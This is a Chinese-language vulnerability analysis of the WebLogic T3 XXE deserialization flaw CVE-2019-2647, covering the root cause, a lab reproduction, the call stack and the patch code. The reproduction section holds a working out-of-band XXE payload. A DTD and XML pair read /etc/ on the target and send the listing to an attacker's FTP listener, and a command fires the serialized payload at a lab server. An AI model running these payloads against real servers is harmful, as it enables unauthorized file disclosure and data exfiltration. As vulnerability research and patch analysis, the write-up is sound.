# Weblogic T3 XXE 反序列化漏洞-CVE-2019-2647

## 漏洞原理

该漏洞点在weblogic.wsee.wstx.internal.ForeignRecoveryContext#readExternal方法可以调用EndpointReference.readFrom方法间接调用weblogic.xml.jaxp.RegistryXMLReader#parse(org.xml.sax.InputSource)来解析**SAXParserFactory**对象加载外部实体

## 漏洞复现

工具：VulnsDebug

在攻击机上创建一个目录，在该目录下创建空的my.dtd文件，然后开启http和ftp服务

mkdir xxe

cd xxe

vim my.dtd

```
<!ENTITY % all
"<!ENTITY &#x25; ftp SYSTEM 'ftp://192.168.8.133:2121/%file;'>"
>
%all; 
```

python -m http.server 8000

python -m pyftpdlib 2121

![image-20221206235407400](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-CVE-2019-2647/image-20221206235407400.png)

创建test.xml文件（功能用于列出/etc/目录下文件）

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
        <!ENTITY % file SYSTEM "file:///etc/">
        <!ENTITY % dtd SYSTEM "http://192.168.8.133:8000/my.dtd">
        %dtd;
      %ftp;
        ]>
<ANY>xxe</ANY>
```

![image-20221206235509816](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-CVE-2019-2647/image-20221206235509816.png) 

运行VulnsDebug的Payload.XXE.CVE_2019_2647#main生成序列化文件

 ![image-20221206235606934](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-CVE-2019-2647/image-20221206235606934.png) 

向服务器发送序列化数据

python weblogic_t3.py 192.168.8.139 7001 xxe/CVE-2019-2647.ser

![image-20221206235722179](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-CVE-2019-2647/image-20221206235722179.png) 

攻击机http服务成功接收请求，ftp服务成功读取weblogic服务器/etc/目录下文件

![image-20221206235920271](D:/Desktop/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Weblogic/Assets/Weblogic%20T3%20XXE%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-CVE-2019-2647/image-20221206235920271.png)

## 漏洞分析

调用栈

```
parse:152, RegistryXMLReader (weblogic.xml.jaxp)
unmarshal0:217, UnmarshallerImpl (com.sun.xml.bind.v2.runtime.unmarshaller)
unmarshal:189, UnmarshallerImpl (com.sun.xml.bind.v2.runtime.unmarshaller)
unmarshal:157, AbstractUnmarshallerImpl (javax.xml.bind.helpers)
unmarshal:125, AbstractUnmarshallerImpl (javax.xml.bind.helpers)
run:136, ProviderImpl$1 (com.sun.xml.ws.spi)
run:132, ProviderImpl$1 (com.sun.xml.ws.spi)
doPrivileged:-1, AccessController (java.security)
readEndpointReference:132, ProviderImpl (com.sun.xml.ws.spi)
readFrom:109, EndpointReference (javax.xml.ws)
readExternal:104, ForeignRecoveryContext (weblogic.wsee.wstx.internal)
readExternalData:1835, ObjectInputStream (java.io)
readOrdinaryObject:1794, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```

## 漏洞修复

漏洞补丁将SAXParserFactory类setFeature禁止加载外部实体

**修复前代码**

weblogic.wsee.wstx.internal.ForeignRecoveryContext#readExternal

```java
public void readExternal(ObjectInput var1) throws ClassNotFoundException, IOException {
    klassVersion = var1.readInt();
    this.fxid = (Xid)var1.readObject();
    this.debug("ForeignRecoveryContext.readExternal tid:" + this.fxid);
    this.version = (Version)var1.readObject();
    int var2 = var1.readInt();
    byte[] var3 = new byte[var2];
    var1.readFully(var3);
    this.epr = EndpointReference.readFrom(new StreamSource(new ByteArrayInputStream(var3)));
    this.debug("ForeignRecoveryContext.readExternal EndpointReference:" + this.epr);
    ForeignRecoveryContextManager.getInstance().add(this);
}
```

**修复后代码**

```java
package weblogic.wsee.wstx.wsat;
import ...
public class WSATStreamHelper {
   public static Source convert(InputStream in) {
      SAXParserFactory spf = SAXParserFactory.newInstance();
      SAXSource xmlSource = null;
      try {
         spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
         spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
         spf.setFeature("http://xml.org/sax/features/validation", false);
         spf.setNamespaceAware(true);
         spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
         xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));
      } catch (Exception var4) {
         if (WSATHelper.isDebugEnabled()) {
            WSATHelper.getInstance().debug("Failed to call setFeature in SAXParserFactory. ");
         }
      }
      return xmlSource;
   }
}
```

weblogic.wsee.wstx.internal.ForeignRecoveryContext#readExternal

```java
public void readExternal(ObjectInput in) throws ClassNotFoundException, IOException {
      klassVersion = in.readInt();
      this.fxid = (Xid)in.readObject();
      this.debug("ForeignRecoveryContext.readExternal tid:" + this.fxid);
      this.version = (Version)in.readObject();
      int len = in.readInt();
      byte[] eprBytes = new byte[len];
      in.readFully(eprBytes);
      this.epr = EndpointReference.readFrom(WSATStreamHelper.convert(new ByteArrayInputStream(eprBytes)));
      this.debug("ForeignRecoveryContext.readExternal EndpointReference:" + this.epr);
      ForeignRecoveryContextManager.getInstance().add(this);
   }
```



## 参考

https://paper.seebug.org/906/

https://paper.seebug.org/900/